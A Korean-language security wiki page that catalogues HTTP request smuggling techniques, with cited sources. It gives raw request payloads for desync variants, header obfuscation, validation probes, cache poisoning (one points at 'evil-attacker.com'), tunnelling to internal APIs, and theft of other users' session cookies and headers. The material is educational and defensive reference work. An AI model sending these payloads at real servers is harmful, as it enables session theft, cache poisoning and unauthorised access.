---
title: HTTP Request Smuggling
description: 
published: true
date: 2025-07-31T20:41:14.355Z
tags: web cache poisoning, cl.te, te.cl, te.te, cl.0, te.0, h2.cl, h2.te, leading whitespace before header name, whitespace before colon, whitespace after colon, line folding, invalid header value, leading‑zero octal, digit‑separator underscore, explicit‑radix hex prefix, bare‑cr chunk delimiter, trailer‑field parsing, bare‑cr injection, null‑byte concatenation, leading empty element, multiple commas, negative content‑length, malformed pipeline after valid chunked, timing‑based validation, status code‑based validation, session hijacking, web cache deception, http request tunneling, denial of service, response queue poisoning, request injection, response body exfiltration, session cookie exfiltration, request header exfiltration
editor: markdown
dateCreated: 2025-07-14T07:56:53.379Z
---

# HTTP Request Smuggling

## 개요

“HTTP Request Smuggling”은 프록시 서버와 백엔드 서버가 HTTP 요청의 본문 경계(Body Boundary)를 서로 다르게 해석할 때 발생하는 구문 분석 불일치 취약점이다. 공격자는 Content‑Length와 Transfer‑Encoding 헤더를 조합하거나 중복 선언함으로써, 앞단 서버와 뒷단 서버 간 요청 분리 방식의 불일치를 유도한다. 이로 인해 하나의 요청 안에 숨겨진 두 번째 요청이 정상적으로 처리되며, 인증 우회, 캐시 중독, 세션 탈취, WAF 우회 등 다양한 형태의 후속 공격으로 이어질 수 있다.

## 분류

> 구문 분석 불일치 (Syntax Parsing Gap)
> → 데이터 경계 파싱 불일치 (Boundary Parsing Mismatch)
> → HTTP Request Smuggling

## 절차

| Phase          | Description                                                                                                                                                 |
| -------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Reconnaissance | 대상 환경의 Frontend 서버와 (리버스 프록시, 로드 밸런서)와 Backend 서버 (애플리케이션 서버) 간의 HTTP 요청 파싱 동작 차이, 지원하는 프로토콜 버전(예: HTTP/1.0, HTTP/1.1), 허용되는 헤더 필드 등 공격을 위한 정보를 수집한다.       |
| Desync         | Frontend 서버와 Backend 서버 간에 서로 다른 기준으로 요청 경계를 해석하도록 유도하는 단계이다. 예를 들어, Content‑Length와 Transfer‑Encoding 헤더를 조합하거나 중복 선언하여 양측 파싱 로직이 서로 다른 잔여 바이트 수를 인식하게 한다. |
| Obfuscation    | 헤더를 다양한 형태로 변형하여 Frontend 서버와 Backend 서버 중 하나 이상의 HTTP 파서가 요청을 다르게 해석하도록 만든다.                                                                               |
| Validation     | 일반적인 요청과의 차이를 바탕으로 취약점의 존재 여부를 판단한다.                                                                                                                        |
| Exploitation   | 의도한 공격 행위를 수행하는 단계이다. 예를 들어, 내부 API 호출 등이 이뤄질 수 있다.                                                                                                         |
| Exfiltration   | 민감한 정보(쿠키·헤더·응답 바디 등)를 추출한다.                                                                                                                                |

<div style="text-align: left;">
  <img
    src="/http_request_smuggling.png"
    alt="HTTP Request Smuggling 다이어그램"
    width="1000"
    style="display: block;
           margin: 0 0 1em 0;
           height: auto;"
  />
</div>

## 공격기법

### Desync

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>CL.TE</td>
      <td><pre><code>POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked
<br>
0
<br>
SMUGGLED</code></pre></td>
      <td>Front-end 서버  <Br>
        <code>Content-Length</code> 헤더 사용 <br> 
<br>
Back-end 서버 <br>
        <code>Transfer-Encoding</code> 헤더 사용
     </td>
      <td>[C]</td>
    </tr>
    <tr>
      <td>TE.CL</td>
      <td><pre><code>POST / HTTP/1.1<br>
Host: vulnerable-website.com<br>
Content-Length: 3<br>
Transfer-Encoding: chunked<br>
<br>
8<br>
SMUGGLED<br>
0</code></pre></td>
      <td>Front-end 서버 <br>
        <code>Transfer-Encoding</code> 헤더 사용 <br>
<br>
Back-end 서버 <br> 
        <code>Content-Length </code> 헤더 사용</td>
      <td>[C]</td>
    </tr>
    <tr>
      <td>CL.0</td>
      <td><pre><code>POST /vulnerable-endpoint HTTP/1.1<br>
Host: vulnerable-website.com<br>
Connection: keep-alive<br>
Content-Type: application/x-www-form-urlencoded<br>
Content-Length: 34<br>
<br>
GET /hopefully404 HTTP/1.1<br>
Foo: x</code></pre></td>
      <td>Front-end 서버 <br>
        <code> Content-Length </code> 사용 <br> 
<br>
Back-end 서버 <br> 
        <code> Content-Length </code> 헤더를 무시하여 <code> Content-Length </code>  헤더의 값이 0 인 것으로 가정하여 요청 본문을 새로운 요청의 시작으로 판단</td>
      <td>[B]</td>
    </tr>
    <tr>
      <td>TE.0</td>
      <td><pre><code>OPTIONS / HTTP/1.1<br>
Host: HOST<br>
…<br>
Transfer-Encoding: chunked<br>
Connection: keep-alive<br>
<br>
50<br>
GET http://our-collaborator-server/ HTTP/1.1<br>
x: X<br>
0<br>
(EMPTY_LINE)<br>
(EMPTY_LINE)</code></pre></td>
      <td>Front-end <br>
        Front‑end가 <code> Transfer‑Encoding</code> 형태의 요청을 <code> Content‑Length </code> 기반으로 변환하며 OPTIONS 메서드로 <code> Content‑Length </code> 를 0으로 처리해 헤더를 누락한다.</td>
      <td>[7]</td>
    </tr>
    <tr>
      <td>H2.CL</td>
      <td><pre><code>:method POST<br>
:path /example<br>
:authority example.com<br>
content-type application/x-www-form-urlencoded<br>
content-length 0<br>
<br>
GET /admin HTTP/1.1<br>
Host: example.com<br>
Content-Length: 10<br>
<br>
x=1</code></pre></td>
      <td>Front-end 서버 <br> 
HTTP 2를 지원하지 않는 Backend 서버를 위해 Front-end 서버가 요청을 HTTP 1.1 형태로 변환하는 과정을 이용. HTTP 2 에서는 <code> Content-Length </code> 헤더의 값을 사용하지 않는데, Front-end 서버가 변환 과정에서 해당 헤더 값을 쓸 경우 요청 경계의 차이가 발생</td>
      <td>[6], [A]</td>
    </tr>
    <tr>
      <td>H2.TE</td>
      <td><pre><code>:method POST<br>
:path /example<br>
:authority example.com<br>
content-type application/x-www-form-urlencoded<br>
transfer-encoding chunked<br>
<br>
0<br>
<br>
GET /admin HTTP/1.1<br>
Host: example.com<br>
Foo: bar</code></pre></td>
      <td>Front-end 서버 <br> 
HTTP 2를 지원하지 않는 Backend 서버를 위해 Front-end 서버가 요청을 HTTP 1.1 형태로 변환하는 과정을 이용. HTTP 2 에서는 <code> Transfer-Encoding </code> 헤더의 값을 참고하지 않는데, Front-end 서버가 변환 과정에서 해당 헤더 값을 쓸 경우 요청 경계의 차이가 발생</td>
      <td>[6], [A]</td>
    </tr>
  </tbody>
</table>

### Obfuscation

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>OWS (Optional WhiteSpace)</td>
      <td><pre><code>[space]Transfer-Encoding: chunked</code></pre></td>
      <td>요청의 시작 라인 이후 첫 번째 헤더 필드 앞에 공백 문자(SP)를 삽입하면, 일부 구현(예: Node.js)은 <code> " Content-Length" </code> 와 같이 공백이 포함된 필드 이름을 원래의 <code> Content-Length </code> 와 다른 헤더로 간주해 무시하고 이로 인해 실제 Content-Length 헤더가 처리되지 않아 뒤따르는 바이트가 새로운 요청으로 해석되며 공격이 가능해진다.</td>
      <td>[D]</td>
    </tr>
    <tr>
      <td>BWS (Bad WhiteSpace)</td>
      <td><pre><code>Transfer-Encoding[space]: chunked<br>
Transfer-Encoding:[tab]chunked</code></pre></td>
      <td>일부 HTTP 파서는 필드 이름과 콜론 사이에 공백(스페이스나 탭)이 들어간 <code> Transfer-Encoding : chunked </code> 같은 헤더를 유효하다고 보고 청크 인코딩 방식으로 본문을 처리하는 반면, 백엔드 서버는 이를 비표준 형식으로 간주해 무시하거나 오류를 내어 Content-Length 기반으로 파싱함으로써 본문 경계가 달라지는 취약점을 이용한 HTTP Request Smuggling 기법이다. 이 방식으로 프런트엔드가 청크 인코딩으로 처리한 뒤 남은 데이터를 백엔드에 숨겨진 추가 요청으로 전달함으로써 인증 우회나 임의 요청 삽입 같은 공격이 가능하다.</td>
      <td>[D], [E]</td>
    </tr>
    <tr>
      <td>Line Folding</td>
      <td><pre><code>obs-fold = CRLF 1*(SP / HTAB)</code></pre></td>
      <td>HTTP/1.x에서는 obs-fold 규칙에 따라 헤더 값을 여러 줄로 나눌 수 있는데, 각 후속 줄은 CRLF 다음에 SP 또는 HTAB으로 시작한다. 일부 구현(예: Node.js)은 이 <code> obs-fold </code> 를 헤더 값의 연장으로 해석해 <code> Transfer-Encoding: chunked\n , identity </code> 와 같이 다중 라인으로 표시된 헤더를 단일 <code> chunked, identity</code> 로 합쳐 처리하지만, 엄격히 <code> obs-fold</code> 를 허용하지 않는 서버는 후속 줄을 새로운 헤더나 요청 본문으로 오인해 처리 경계가 엇갈리게 된다.</td>
      <td>[D]</td>
    </tr>
    <tr>
      <td>Invalid Header Value</td>
      <td><pre><code>Transfer-Encoding: x<br>
Transfer-Encoding: xchunked</code></pre></td>
      <td><code> Transfer-Encoding</code>  헤더에 비표준 값(예: x 또는 xchunked)을 사용하면, 일부 HTTP 파서는 해당 헤더를 완전히 무시해 <code> Content-Length</code>  기반으로 본문 경계를 파싱하고, 다른 파서는 <code> suffix </code>  매칭 등을 통해 <code> xchunked </code> 를 유효한 <code> chunked </code>  인코딩으로 해석하여 <code> chunked </code>  모드로 처리한다.</td>
      <td>[F]</td>
    </tr>
    <tr>
      <td>Leading‑zero octal</td>
      <td><pre><code>Content-Length: 0200</code></pre></td>
      <td>웹 서버 내부적으로 정수 파싱을 담당하는 C, Python 등 라이브러리 함수가 정수를 파싱하는 방법의 차이를 이용. 하나의 서버는 8 진수로 해석하고, 다른 서버는 10 진수로 해석</td>
      <td>[4]</td>
    </tr>
    <tr>
      <td>Digit‑separator underscore</td>
      <td><pre><code>POST / HTTP/1.1\r\n
Transfer-Encoding: chunked\r\n
\r\n
0_ff\r\n
[255 Byte Data]\r\n
0\r\n
\r\n
GET /steal HTTP/1.1\r\n
Host: victim\r\n
\r\n</code></pre></td>
      <td>0_ff 를 0 으로 해석하는 서버와 255 로 해석하는 서버가 모두 존재</td>
      <td>[4]</td>
    </tr>
    <tr>
      <td>Explicit‑radix hex prefix</td>
      <td><pre><code>POST / HTTP/1.1\r\n
Transfer-Encoding: chunked\r\n
\r\n
0x10\r\n
[16 Byte Data]\r\n
0\r\n
\r\n
GET /secret HTTP/1.1\r\n
Host: victim\r\n
\r\n</code></pre></td>
      <td>일부 구현은 0x10 을 16 으로, 다른 구현은 유효하지 않은 Chunk 로 처리</td>
      <td>[4]</td>
    </tr>
    <tr>
      <td>Bare‑CR chunk delimiter</td>
      <td><pre><code>POST / HTTP/1.1\r\n
Transfer-Encoding: chunked\r\n
\r\n
2\r\r;a\r\n
02\r\n
2d\r\n
0\r\n
\r\n
DELETE / HTTP/1.1\r\n
Content-Length: 23\r\n
\r\n
0\r\n
\r\n
GET /bypass HTTP/1.1\r\n
\r\n</code></pre></td>
      <td>청크 길이 뒤에 표준인 <code> CRLF(\r\n) </code>  대신 <code> CR(\r)</code> 만 사용했을 때 파서마다 줄 구분을 다르게 해석하는 점을 악용한 것으로, 일부 구현체(A)는 <code> 2\r;a </code> 를 “길이 2짜리 청크, 확장은 무시”로 보고 뒤따르는 <code> DELETE / HTTP/1.1… </code> 를 청크 본문으로 흡수하지만, 다른 구현체(B)는 <code> 2\r </code> 만 청크 길이로 인식하고 <code> ;a </code> 를 일반 문자로 처리해 이후 요청을 별도 HTTP 메시지로 분리함으로써 의도치 않은 추가 요청 <code> (GET /bypass HTTP/1.1) </code> 을 실행하게 만드는 HTTP Request Smuggling 기법이다.</td>
      <td>[4], [I]</td>
    </tr>
    <tr>
      <td>Trailer‑field parsing</td>
      <td><pre><code>POST / HTTP/1.1\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
A:GET /evil HTTP/1.1\r\n</code></pre></td>
      <td>Transfer-Encoding: chunked 요청에서 청크 종료 시점인 0\r\n 뒤에 임의의 두 문자를 붙이면, 백엔드의 Puma 서버는 CRLF 다음 두 문자를 “청크 스트림 종료”로 인식해 그 이후를 새로운 요청으로 분리하지만, 프론트엔드의 다른 서버들은 해당 두 문자가 trailer-field(예: A:…)로 해석하여 단순히 추가 헤더로 처리하기 때문에 HTTP 메시지 경계가 불일치하여 GET /evil HTTP/1.1 요청이 실행될 수 있는 HTTP Request Smuggling 기법이다. 단, A: 뒤에 공백이 있어야 프론트엔드가 헤더로 인식하므로, 공백을 삽입하면 공격이 무력화된다.) </td>
      <td>[4]</td>
    </tr>
    <tr>
      <td>Bare‑CR Header Field Injection</td>
      <td><pre><code>GET / HTTP/1.1\r\n
Host: victim\r\n
Whatever: foo\rContent-Length: 10\r\n
\r\n
[10바이트 데이터]\r\n</code></pre></td>
      <td>헤더 라인 구분자를 CRLF만 인정해야 하지만, 일부 구현이 CR(또는 LF, NULL)를 라인 끝으로 허용·전달하는 차이를 악용</td>
      <td>[4]</td>
    </tr>
    <tr>
      <td>NULL‑byte concatenation</td>
      <td><pre><code>POST / HTTP/1.1
Host: victim
Content-Length: 6
X-Exploit: A\0Content-Length: 13 
<br>
HELLO!
GET /admin HTTP/1.1
Host: victim
</code></pre></td>
      <td>클라이언트가 Content-Length: 6 헤더를 포함한 뒤에 X-Exploit: A\0Content-Length: 13처럼 NULL 바이트(\0)를 삽입한 추가 데이터를 전송하면 발생한다. relayd는 NULL 바이트를 무시하지 않고 “바이트 그대로” 직전 헤더 뒤에 이어붙여 백엔드로 전송하는데, 이때 relayd 자체는 Content-Length를 13으로 파악해 전체 메시지를 수신 대기하지만, 백엔드 서버는 첫 번째 Content-Length: 6만 읽고 이후 NULL 바이트 이후의 데이터(“Content-Length: 13” 및 그 뒤에 숨겨진 GET /admin HTTP/1.1 요청)를 본문 일부가 아닌 새로운 요청으로 처리할 수 있다. 따라서 공격자는 본문 6바이트 이후에 숨겨둔 추가 요청을 백엔드에 Smuggling 할 수 있게 된다.</td>
      <td>[4]</td>
    </tr>
    <tr>
      <td>Leading empty element</td>
      <td><pre><code>POST / HTTP/1.1\r\n
Transfer-Encoding: ,chunked\r\n
\r\n
0\r\n
\r\n
GET /admin HTTP/1.1\r\n
Host: victim\r\n
\r\n</code></pre></td>
      <td>리스트형 헤더(Transfer-Encoding 등)의 빈 요소 처리 규약이 RFC ABNF에 명시돼 있지 않아, 빈 요소를 무시해야 하지만 일부 구현이 빈 요소를 구분·전달하는 차이를 이용</td>
      <td>[4]</td>
    </tr>
    <tr>
      <td>Multiple commas</td>
      <td><pre><code>POST / HTTP/1.1\r\n
Transfer-Encoding: chunked,,chunked\r\n
\r\n
0\r\n
\r\n
GET /steal HTTP/1.1\r\n
Host: victim\r\n
\r\n</code></pre></td>
      <td>리스트형 헤더(Transfer-Encoding 등)의 빈 요소 처리 규약이 RFC ABNF에 명시돼 있지 않아, 빈 요소를 무시해야 하지만 일부 구현이 빈 요소를 구분·전달하는 차이를 이용</td>
      <td>[4]</td>
    </tr>
    <tr>
      <td>Negative Content‑Length</td>
      <td><pre><code>Content-Length: -1</code></pre></td>
      <td>파싱 로직의 예외 처리를 이용해 무한 루프 또는 크래시를 유발파싱 로직의 예외 처리를 이용해 무한 루프 또는 크래시를 유발</td>
      <td>[4]</td>
    </tr>
    <tr>
      <td>TE.TE</td>
      <td><pre><code>POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding[TAB]: chunked 
<br>
8
SMUGGLED
0</code></pre></td>
      <td>Front-end 서버와 Back-end 서버 모두 Transfer-Encoding헤더 지원
헤더를 난독화해서 서버 중 하나가 난독화한 헤더를 처리하지 않도록 유도해서 차이를 발생 시킴</td>
      <td>[C]</td>
    </tr>
  </tbody>
</table>

### Validation

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Timing‑based Validation</td>
      <td><pre><code>POST / HTTP/1.1<br>
Host: vulnerable-website.com<br>
Transfer-Encoding: chunked<br>
Content-Length: 4<br>
<br>
1<br>
A<br>
X</code></pre></td>
      <td>프런트엔드는 Content-Length만큼(4바이트)만 전달하고 종료해 백엔드는 첫 청크(1→A) 처리 후 다음 청크(X)를 기다리며 지연을 발생시킨다.</td>
      <td>[G]</td>
    </tr>
    <tr>
      <td>Status Code‑based Validation</td>
      <td><pre><code>POST / HTTP/1.1 
Host: vulnerable-website.com 
Transfer-Encoding: chunked 
Content-Length: 3 <br>
<br>
0 <br>
<br>
GET /404 HTTP/1.1; <br>
<br>
GET / HTTP/1.1 
Host: vulnerable-website.com</code></pre></td>
      <td>첫 번째 요청으로 /404 경로를 스머글링한 뒤 즉시 평범한 GET / 요청을 전송해, 두 번째 요청의 상태 코드가 404 Not Found로 바뀌는지를 비교해 취약을 확인한다.</td>
      <td>[J]</td>
    </tr>
  </tbody>
</table>

### Exploitation

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Session Hijacking</td>
      <td><pre><code>POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 6
Transfer-Encoding: chunked 
<br>
0 
<br>
GET /admin HTTP/1.1
Host: vulnerable-website.com
Cookie: session=victim_session_token</code></pre></td>
      <td>HTTP Request Smuggling을 통해 다른 사용자의 요청과 응답을 가로채어 세션 토큰이나 민감한 정보를 탈취하는 공격으로 프록시/로드밸런서와 백엔드 서버 간의 파싱 차이를 이용해 타 사용자의 응답을 자신의 요청에 대한 응답으로 받을 수 있게된다.</td>
      <td>[A], [C]</td>
    </tr>
    <tr>
      <td>Web Cache Poisoning</td>
      <td><pre><code>POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 59
Transfer-Encoding: chunked 
<br>
0 
<br> 
GET /static/innocent.js HTTP/1.1
Host: evil-attacker.com</code></pre></td>
      <td>Request Smuggling을 통해 캐시 서버에 악성 응답을 저장시켜, 이후 정상 사용자들이 해당 캐시된 악성 콘텐츠를 받도록 하는 공격으로 프론트엔드 캐시와 백엔드 서버의 요청 해석차이를 악용한다.</td>
      <td>[2], [A]</td>
    </tr>
    <tr>
      <td>Web Cache Deception</td>
      <td><pre><code>POST / HTTP/1.1
Host: vulnerable-website.com  
Content-Length: 35
Transfer-Encoding: chunked 
<br> 
0  
<br> 
GET /profile/user.css HTTP/1.1
Host: vulnerable-website.com</code></pre></td>
      <td>캐시 서버로 하여금 동적이고 민감한 콘텐츠를 정적 파일로 오인하게 만들어 캐시하도록 유도하는 공격입니다. Request Smuggling을 통해 URL 경로를 조작하여 개인정보가 포함된 페이지를 캐시에 저장시킨다.</td>
      <td>[6], [D]</td>
    </tr>
    <tr>
      <td>HTTP Request Tunneling</td>
      <td><pre><code>POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Length: 52
Transfer-Encoding: chunked 
<br> 
0 
<br> 
GET /admin/delete-user?id=123 HTTP/1.1
Host: internal-api.local</code></pre></td>
      <td>Request Smuggling을 이용해 방화벽이나 보안 장비를 우회하여 내부 네트워크로 HTTP 요청을 터널링하는 공격이다. 프록시 서버의 파싱 오류를 악용해 제한된 리소스에 접근하거나 내부 API를 호출할 수 있다.</td>
      <td>[5], [E]</td>
    </tr>
    <tr>
      <td>Denial of Service</td>
      <td><pre><code>POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Transfer-Encoding: chunked 
<br>
99999999
a 
0</code></pre></td>
      <td>Request Smuggling을 통해 서버의 연결 풀을 고갈시키거나 파싱 오류를 유발하여 서비스를 마비시키는 공격이다. 잘못된 Content-Length나 Transfer-Encoding 헤더를 사용해 서버가 무한정 대기하거나 크래시하도록 만든다.</td>
      <td>[F], [4]</td>
    </tr>
    <tr>
      <td>Response Queue Poisoning</td>
      <td><pre><code>POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 11
Transfer-Encoding: chunked  
<br>
0  
<br>
GPOST /x HTTP/1.1
Host: vulnerable-website.com
Content-Length: 100 <br>
x=</code></pre></td>
      <td>Request Smuggling을 통해 서버의 응답 큐를 조작하여 다른 사용자의 요청에 대한 응답을 받거나, 악성 응답을 큐에 주입하는 공격이다. 연결 재사용 메커니즘의 취약점을 악용한다.</td>
      <td>[G], [H]</td>
    </tr>
    <tr>
      <td>Request Injection</td>
      <td><pre><code>POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 83
Transfer-Encoding: chunked 
<br>
0 
<br>
POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Length: 15 
<br> 
username=admin
GET / HTTP/1.1
Host: vulnerable-website.com</code></pre></td>
      <td>Request Smuggling을 통해 백엔드 서버에 임의의 HTTP 요청을 주입하는 공격이다. 프론트엔드와 백엔드 간의 요청 경계 인식 차이를 악용하여 추가적인 요청을 몰래 삽입한다.</td>
      <td>[7], [B]</td>
    </tr>
  </tbody>
</table>

### Exfiltration

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Response Body Exfiltration</td>
      <td><pre><code>POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Transfer-Encoding: chunked 
<br>
0 
<br>
GET /private/messages HTTP/1.1</code></pre></td>
      <td>파이프라인된 GET 요청을 smuggle하여 백엔드 응답 큐가 어긋나게 만들어, 다음 사용자(victim)의 /private/messages 응답 본문 일부 또는 전체를 공격자가 직접 수신하는 공격. 백엔드 서버는 smuggled 요청을 별개의 요청으로 처리하고, 그 응답을 다음 정상 요청에 대한 응답으로 잘못 매핑한다.</td>
      <td>[A], [C]</td>
    </tr>
    <tr>
      <td>Session Cookie Exfiltration</td>
      <td><pre><code>POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 63
Transfer-Encoding: chunked 
<br>
0 
<br>
POST /post/comment HTTP/1.1
Content-Length: 15 
<br>
comment=stolen</code></pre></td>
      <td>다음 사용자(victim)가 전송한 요청의 쿠키와 헤더가 smuggled된 POST 요청의 본문으로 추가되어, 이후 공격자가 해당 댓글을 조회하여 세션 쿠키와 기타 민감한 헤더 정보를 탈취할 수 있는 공격이다.</td>
      <td>[A], [C]</td>
    </tr>
    <tr>
      <td>Request Header Exfiltration</td>
      <td><pre><code>POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Transfer-Encoding: chunked 
<br>
0 
<br>
POST /feedback HTTP/1.1
Content-Length: 100 
<br>
csrf=token&subject=
0 
<br>
POST /submit HTTP/1.1</code></pre></td>
      <td>프런트엔드가 내부 헤더(예: X-Internal-User, X-Forwarded-For)를 백엔드로 전달할 때, smuggled 요청을 통해 다음 사용자의 요청 헤더가 subject= 파라미터 값으로 연결되어 백엔드 응답에 반사되면, 공격자가 내부 헤더 값을 추출할 수 있다.</td>
      <td>[A], [E]</td>
    </tr>
  </tbody>
</table>


## 분류에 해당하는 문서

\[1] [https://dl.acm.org/doi/pdf/10.1145/3460120.3485384](https://dl.acm.org/doi/pdf/10.1145/3460120.3485384)
\[2] [https://i.blackhat.com/USA-20/Wednesday/us-20-Klein-HTTP-Request-Smuggling-In-2020-New-Variants-New-Defenses-And-New-Challenges-wp.pdf](https://i.blackhat.com/USA-20/Wednesday/us-20-Klein-HTTP-Request-Smuggling-In-2020-New-Variants-New-Defenses-And-New-Challenges-wp.pdf)
\[3] [https://dl.acm.org/doi/pdf/10.1145/3678890.3678904](https://dl.acm.org/doi/pdf/10.1145/3678890.3678904)
\[4] [https://arxiv.org/pdf/2405.17737](https://arxiv.org/pdf/2405.17737)
\[5] [https://www.petsymposium.org/foci/2024/foci-2024-0012.pdf](https://www.petsymposium.org/foci/2024/foci-2024-0012.pdf)
\[6] [https://www.usenix.org/system/files/sec22-jabiyev.pdf](https://www.usenix.org/system/files/sec22-jabiyev.pdf)
\[7] [https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)

## 기타 참고문헌

\[A] [https://portswigger.net/web-security/request-smuggling/advanced](https://portswigger.net/web-security/request-smuggling/advanced)
\[B] [https://portswigger.net/web-security/request-smuggling/browser/cl-0#testing-for-cl-0-vulnerabilities](https://portswigger.net/web-security/request-smuggling/browser/cl-0#testing-for-cl-0-vulnerabilities)
\[C] [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
\[D] [https://infosec.zeyu2001.com/2022/http-request-smuggling-in-the-multiverse-of-parsing-flaws](https://infosec.zeyu2001.com/2022/http-request-smuggling-in-the-multiverse-of-parsing-flaws)
\[E] [https://medium.com/@knownsec404team/protocol-layer-attack-http-request-smuggling-cc654535b6f](https://medium.com/@knownsec404team/protocol-layer-attack-http-request-smuggling-cc654535b6f)
\[F] [https://www.imperva.com/learn/application-security/http-request-smuggling](https://www.imperva.com/learn/application-security/http-request-smuggling)
\[G] [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
\[H] [https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses](https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses)
